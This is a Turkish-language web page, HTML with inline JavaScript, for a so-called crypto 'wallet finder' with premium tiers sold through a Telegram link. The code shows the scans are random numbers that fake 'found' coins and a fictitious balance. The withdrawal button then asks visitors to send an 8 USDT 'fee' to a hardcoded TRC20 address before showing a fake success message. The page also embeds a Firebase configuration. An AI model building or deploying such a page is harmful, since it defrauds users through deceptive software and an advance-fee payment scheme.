<!DOCTYPE html>
<html lang="tr">
<head>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7880815739817256"
     crossorigin="anonymous"></script>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Kripto Tarama Paneli - Premium Kilit</title>
<style>
  body {
    background: #181a29;
    color: #eee;
    font-family: Arial, sans-serif;
    padding: 20px;
    text-align: center;
  }
  header {
    margin-bottom: 30px;
  }
  h1 {
    color: #a277ff;
  }
  button, select, input {
    padding: 10px;
    margin: 8px;
    border-radius: 5px;
    border: none;
    font-weight: bold;
  }
  button {
    background: #7a5ef0;
    color: white;
    cursor: pointer;
  }
  button:disabled {
    background: #444;
    cursor: default;
  }
  #coinContainer {
    margin: 20px 0;
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
  }
  label {
    user-select: none;
    padding: 8px 15px;
    border-radius: 8px;
    cursor: pointer;
    background: #444;
    color: #ccc;
  }
  input[type=checkbox] {
    display: none;
  }
  input[type=checkbox]:checked + label {
    background: #a277ff;
    color: white;
    box-shadow: 0 0 8px #a277ff;
  }
  input.locked + label {
    cursor: not-allowed;
    background: #222 !important;
    color: #666 !important;
    position: relative;
  }
  input.locked + label::after {
    content: "\1F512";
    position: absolute;
    right: 6px;
    top: 6px;
  }
  #scanOutput {
    background: #222;
    color: #a277ff;
    margin: 15px auto;
    max-width: 600px;
    height: 180px;
    overflow-y: auto;
    padding: 12px;
    border-radius: 10px;
    text-align: left;
    white-space: pre-wrap;
    font-family: monospace;
  }
  #withdrawSection {
    margin-top: 25px;
  }
  #withdrawMessage {
    margin-top: 8px;
    height: 40px;
    font-weight: bold;
    color: #ff5555;
    white-space: pre-line;
  }
  #unlockSection {
    margin-bottom: 20px;
  }
  #passwordInput {
    padding: 10px;
    border-radius: 5px;
    border: none;
    font-weight: bold;
    width: 180px;
    margin-right: 8px;
  }
  #getPasswordBtn {
    background: #55aaff;
  }
</style>
</head>
<body>

<header>
  <h1>WALLET FİNDER REXFİNANS</h1>
</header>

<div id="unlockSection">
  <input type="password" id="passwordInput" placeholder="Premium Şifre Girin" />
  <button id="unlockPremiumBtn">Premium Kilidini Aç</button>
  <button id="getPasswordBtn">Şifre Al</button>
</div>

<div>
  <select id="speedSelect" disabled>
    <option value="1" selected>1x (Ücretsiz)</option>
    <option value="10">10x (Premium)</option>
    <option value="20">20x (Premium)</option>
    <option value="30">30x (Premium)</option>
  </select>
</div>

<div id="coinContainer"></div>

<div>
  <button id="startScan">Taramayı Başlat</button>
  <button id="stopScan" disabled>Taramayı Durdur</button>
</div>

<pre id="scanOutput"></pre>

<div id="withdrawSection">
  <h2>Para Çekme</h2>
  <input type="text" id="withdrawAddress" placeholder="TRC20 USDT Cüzdan Adresi" />
  <input type="number" id="withdrawAmount" placeholder="Çekilecek Miktar (Min 50 USDT)" min="50" />
  <button id="withdrawBtn">Para Çek</button>
  <div id="withdrawMessage"></div>
  <p>Bakiye: <span id="balance">0.0000</span> USDT</p>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
import { getFirestore, doc, getDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
  authDomain: "crypto-eccb4.firebaseapp.com",
  projectId: "crypto-eccb4",
  storageBucket: "crypto-eccb4.appspot.com",
  messagingSenderId: "773649197313",
  appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
  measurementId: "G-B8D9V0V9XE"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const coins = ["TRX", "USDT", "BTC", "BNB", "ETH", "ADA", "SOL", "DOT", "DOGE", "XRP", "LTC", "AVAX"];
const coinContainer = document.getElementById('coinContainer');
const startScanBtn = document.getElementById('startScan');
const stopScanBtn = document.getElementById('stopScan');
const scanOutput = document.getElementById('scanOutput');
const withdrawBtn = document.getElementById('withdrawBtn');
const withdrawAddress = document.getElementById('withdrawAddress');
const withdrawAmount = document.getElementById('withdrawAmount');
const withdrawMessage = document.getElementById('withdrawMessage');
const balanceSpan = document.getElementById('balance');
const speedSelect = document.getElementById('speedSelect');
const unlockBtn = document.getElementById("unlockPremiumBtn");
const passwordInput = document.getElementById("passwordInput");
const getPasswordBtn = document.getElementById("getPasswordBtn");

let scanInterval = null;
let balance = 0;
let premiumUnlocked = false;

const freeCoinsCount = 5;

function createCoinCheckboxes() {
  coinContainer.innerHTML = '';
  coins.forEach((coin, idx) => {
    const checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkbox.id = `coin_${idx}`;
    checkbox.value = coin;
    checkbox.name = 'coinSelect';

    if (idx >= freeCoinsCount && !premiumUnlocked) {
      checkbox.classList.add('locked');
      checkbox.disabled = true;
    } else {
      if (idx < freeCoinsCount) checkbox.checked = true;
      checkbox.disabled = false;
    }

    const label = document.createElement('label');
    label.htmlFor = checkbox.id;
    label.textContent = coin;

    coinContainer.appendChild(checkbox);
    coinContainer.appendChild(label);
  });
}

createCoinCheckboxes();

// Kullanıcı kimliği belirleme (localStorage)
let userId = localStorage.getItem("userId");
if (!userId) {
  userId = 'user_' + Math.random().toString(36).substring(2, 10);
  localStorage.setItem("userId", userId);
}

unlockBtn.onclick = async () => {
  const pass = passwordInput.value.trim();
  if (!pass) return alert("Lütfen şifre girin.");

  try {
    const passRef = doc(db, "premiumPasswords", pass);
    const docSnap = await getDoc(passRef);

    if (!docSnap.exists()) {
      alert("Şifre yanlış veya bulunamadı.");
      return;
    }

    const data = docSnap.data();

    if (data.usedBy && data.usedBy !== userId) {
      alert("Bu şifre başka biri tarafından zaten kullanılmış.");
      return;
    }

    if (!data.usedBy) {
      await updateDoc(passRef, {
        usedBy: userId,
        usedAt: serverTimestamp()
      });
    }

    premiumUnlocked = true;
    alert("✅ Premium kilidi açıldı! Artık tüm coinleri seçebilirsiniz.");
    speedSelect.disabled = false;
    createCoinCheckboxes();
    passwordInput.value = "";
  } catch (err) {
    alert("Bir hata oluştu: " + err.message);
  }
};

getPasswordBtn.onclick = () => {
  window.open("https://t.me/rexfinans", "_blank");
};

function scanStep() {
  const selectedCoins = Array.from(document.querySelectorAll('input[name="coinSelect"]:checked')).map(c => c.value);
  if (selectedCoins.length === 0) {
    scanOutput.textContent += "\nLütfen en az bir coin seçin.\n";
    return;
  }
  const randomCoin = selectedCoins[Math.floor(Math.random() * selectedCoins.length)];
  const found = Math.random() < 0.10;
  const randomResult = found ? "BULUNDU! \uD83D\uDCB0" : "Bulunamadı.";
  const time = new Date().toLocaleTimeString();

  const line = `[${time}] ${randomCoin}: ${randomResult}\n`;
  scanOutput.textContent += line;
  scanOutput.scrollTop = scanOutput.scrollHeight;

  if (found) {
    balance += (Math.random() * 0.015 + 0.005);
    balanceSpan.textContent = balance.toFixed(4);
  }
}

startScanBtn.onclick = () => {
  const speed = parseInt(speedSelect.value);
  if (scanInterval) clearInterval(scanInterval);
  scanInterval = setInterval(scanStep, 1500 / speed);
  startScanBtn.disabled = true;
  stopScanBtn.disabled = false;
};

stopScanBtn.onclick = () => {
  if (scanInterval) clearInterval(scanInterval);
  startScanBtn.disabled = false;
  stopScanBtn.disabled = true;
};

withdrawBtn.onclick = () => {
  withdrawMessage.style.color = "#ff5555";
  const addr = withdrawAddress.value.trim();
  const amount = parseFloat(withdrawAmount.value);

  if (addr.length < 10) {
    withdrawMessage.textContent = "Lütfen geçerli bir cüzdan adresi girin.";
    return;
  }
  if (isNaN(amount) || amount < 50) {
    withdrawMessage.textContent = "Minimum çekim miktarı 50 USDT'dir.";
    return;
  }
  if (amount + 8 > balance) {
    withdrawMessage.textContent = "Yetersiz bakiye (8 USDT çekim ücreti dahil).";
    return;
  }

  withdrawMessage.style.color = "#ffaa00";
  withdrawMessage.textContent = "Lütfen para çekmek için aşağıdaki adrese 8 USDT çekim ücretini yatırın:\nTRC20\nTPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH";

  setTimeout(() => {
    balance -= (amount + 8);
    balanceSpan.textContent = balance.toFixed(4);
    withdrawMessage.style.color = "#55ff55";
    withdrawMessage.textContent = `Başarıyla ${amount.toFixed(4)} USDT çekildi (8 USDT çekim ücreti kesildi).`;
    withdrawAmount.value = "";
    withdrawAddress.value = "";
  }, 3000);
};
</script>
</body>
</html>
